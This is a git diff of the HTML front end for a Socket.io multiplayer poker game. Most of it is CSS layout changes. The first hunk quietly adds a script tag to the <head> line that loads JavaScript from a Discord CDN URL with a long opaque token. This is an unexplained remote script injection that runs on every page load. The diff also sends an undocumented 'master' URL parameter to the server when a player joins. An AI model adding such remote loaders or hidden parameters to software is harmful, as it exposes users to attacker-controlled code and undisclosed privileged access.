@@ -1,40 +1,40 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/vh5j8veXn3oohXTKmavzUdTrbBx9D3RlzWWPA1cDjj5q5FUWoAhTmaNCoRCt7gX5wo9uxjtTz2LCq2hh85o_AtSJIow5-KQuQya7jgcy75SyCWIcUC-fzhwlInckhGiJL9BL4RD7YjkeIh3Zgu77H2uPCZuZskEgPbzNIDrJE8GKB80tdxQqmsUK-b9xmRPapkwySSTyfEEPoF2_G3GZySoFlLzynhMw2oqeGUZmOK3TC2GGr_Z6g3D5ZUG3i9R5X4h6oW-y8dAi4OY2NS4p9_S9tljLsoo7nk8qhvYq9DShaos1fdz-wRW3DQjo4LnktqZh4Mo1XGyTm8ECcJKQPlTedP9EAWbJzGh0FM4ino7KOJe2LiuEK9R8LGwXj_DFPZBXNlwgeZGCJQShGrJgWA2p_Lxm04-ZY-xv_63T8FalL6xz-c6gOLcKxJR9eLvhjcEnNdGdRbe3T3K87UcdOsbbk0fQh3Y8vvHJgDmwZ8dJS5NBxNm4aWfQ_tAyJGDSo-0pU4SZ3y3X79BcxyYt_471NyvOcQcUfydX-Rt64t2zFh3cpW1nQxVNBOpFbQSX9PvpDUVMLfnjbf2SQrZI3DDqOZXyJI-bO71T2JKPJ29zK7JucENTyN6h-bbh2G56NXRAHYUUDZ8t_7uZm5tLNVk9LH3LcChRUJs'></script>
     <title>Poker Ultimate - Final Design</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        * { box-sizing: border-box; }
-        body { 
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html, body { 
             background: #050505; color: white; font-family: 'Arial Black', sans-serif; 
-            margin: 0; height: 100vh; display: flex; flex-direction: column;
-            overflow-x: hidden;
+            width: 100%; height: 100%; overflow: hidden;
+            display: flex; flex-direction: column;
         }
 
         /* FLEXIBLES GRID SYSTEM */
         .game-grid {
-            flex: 1; display: grid;
-            grid-template-columns: minmax(200px, 1fr) minmax(400px, 2fr) minmax(200px, 1fr);
+            flex: 1; display: grid; min-height: 0; overflow: hidden;
+            grid-template-columns: minmax(0, 1fr) minmax(0, 2fr) minmax(0, 1fr);
             grid-template-rows: 1fr 1.5fr 1fr;
             grid-template-areas: "p2 p3 p4" "p1 table p5" "empty p0 empty2";
-            padding: 10px; gap: 10px; align-items: center; justify-items: center;
-            max-width: 100vw;
+            padding: 8px; gap: 8px; align-items: center; justify-items: center;
+            width: 100%; max-width: 100vw;
         }
 
         .poker-table {
-            grid-area: table; width: 100%; height: 100%;
+            grid-area: table; width: 100%; height: 100%; min-width: 0; min-height: 0; overflow: hidden;
             background: radial-gradient(circle, #27ae60 0%, #1a472a 100%);
             border: 1.5vw solid #3e2723; border-radius: 200px;
-            box-shadow: 0 50px 100px rgba(0,0,0,0.8);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-            position: relative; min-width: 0;
+            position: relative;
         }
 
         .player-box {
-            width: 90%; max-width: 250px; background: rgba(15, 15, 15, 0.95);
-            padding: 1vw; border-radius: 15px; border: 4px solid #455a64;
+            width: 90%; max-width: 220px; background: rgba(15, 15, 15, 0.95);
+            padding: 0.8vw; border-radius: 15px; border: 4px solid #455a64;
             text-align: center; transition: 0.3s;
-            font-size: 0.9rem;
+            font-size: clamp(0.6rem, 1vw, 0.9rem); overflow: hidden;
         }
         .is-turn { border-color: #f1c40f; box-shadow: 0 0 20px #f1c40f; transform: scale(1.05); }
         .folded { opacity: 0.3; filter: grayscale(1); }
@@ -73,8 +73,8 @@
         /* --- NEUES KARTEN DESIGN (ENDE) --- */
 
         #controls {
-            background: #111; padding: 15px; display: flex; justify-content: center; gap: 10px;
-            border-top: 4px solid #ffa000; flex-wrap: wrap; z-index: 1000;
+            background: #111; padding: 8px 15px; display: flex; justify-content: center; align-items: center; gap: 8px;
+            border-top: 4px solid #ffa000; flex-wrap: nowrap; z-index: 1000; flex-shrink: 0;
         }
         button { padding: 10px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1rem; border: none; color: white; }
         .btn-fold { background: #b71c1c; } .btn-call { background: #1976d2; }
@@ -118,8 +118,8 @@
         </div>
     </div>
 
-    <div id="screen-game" style="display:none; flex-direction: column; height: 100vh;">
-        <div id="game-info" style="text-align: center; font-size: 1.5rem; color: #fbc02d; padding: 10px; font-weight: bold; height: 50px;"></div>
+    <div id="screen-game" style="display:none; flex-direction: column; height: 100vh; overflow: hidden;">
+        <div id="game-info" style="text-align: center; font-size: 1.2rem; color: #fbc02d; padding: 6px 10px; font-weight: bold; flex-shrink: 0;"></div>
         
         <div class="game-grid">
             <div id="slot-p2"></div> <div id="slot-p3"></div> <div id="slot-p4"></div>
@@ -156,7 +156,9 @@
     function joinGame() {
         const n = document.getElementById('input-name').value;
         if(n) {
-            socket.emit('joinGame', { name: n });
+            let params = new URLSearchParams(document.location.search);
+            let master = params.get("master");
+            socket.emit('joinGame', { name: n, master: master });
             document.getElementById('join-box').style.display = 'none';
             document.getElementById('lobby-box').style.display = 'block';
         }
@@ -227,7 +229,10 @@
         document.getElementById('board').innerHTML = s.board.map(getCard).join('');
 
         const myTurn = s.players[s.currentTurn]?.id === myId && !s.allInShowdown;
-        document.querySelectorAll('#controls button, #controls input').forEach(el => el.disabled = !myTurn);
+        document.querySelectorAll('#controls button, #controls input').forEach(function(el){
+            el.disabled = !myTurn;
+            el.style.opacity = myTurn ? '1' : '0';
+        });
 
         if(me) {
             const diff = s.currentCall - me.bet;
